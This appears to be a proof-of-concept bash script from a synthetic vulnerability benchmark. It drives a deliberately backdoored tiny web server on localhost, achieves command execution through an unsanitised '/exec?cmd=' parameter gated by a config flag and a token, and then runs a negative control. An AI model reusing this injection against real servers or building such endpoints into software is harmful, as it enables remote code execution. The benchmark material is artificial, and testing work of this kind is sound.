#!/usr/bin/env bash
# PoC for 134_tiny-web-server_C3I3S1
# Axes: C3 (config file + runtime init state) / I3 (struct dispatch) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (tiny) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/tiny"
WWWROOT="/tmp/poc_134_www"
MARKER="/tmp/poc_134_marker"
CONF="/tmp/poc_134.conf"
INITFLAG="/tmp/tiny_exec_init_18134"
PORT=18134

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { pkill -P "$SERVER_PID" 2>/dev/null || true; kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF" "$INITFLAG"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── write config file ──────────────────────────────────────────────────────────
cat > "$CONF" <<EOF
exec_mode = 1
exec_secret = s3cr3t
EOF

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting tiny with --config $CONF on port $PORT..."
"$BINARY" --config "$CONF" "$WWWROOT" $PORT &
SERVER_PID=$!
sleep 0.4

# ── init step: validate token and create init flag file ───────────────────────
echo "[*] calling /exec/init?token=s3cr3t..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t" > /dev/null

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

sleep 0.1

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: exec_mode=0 in config → /exec returns 404 ───────────────
echo "[*] verifying gate: endpoint must be absent with exec_mode=0..."
CONF_NEG="/tmp/poc_134_neg.conf"
cat > "$CONF_NEG" <<EOF
exec_mode = 0
exec_secret = s3cr3t
EOF
NEG_PORT=19134
"$BINARY" --config "$CONF_NEG" "$WWWROOT" $NEG_PORT &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
pkill -P "$NEG_PID" 2>/dev/null || true; kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
rm -f "$CONF_NEG" "/tmp/tiny_exec_init_19134"
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 with exec_mode=0"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
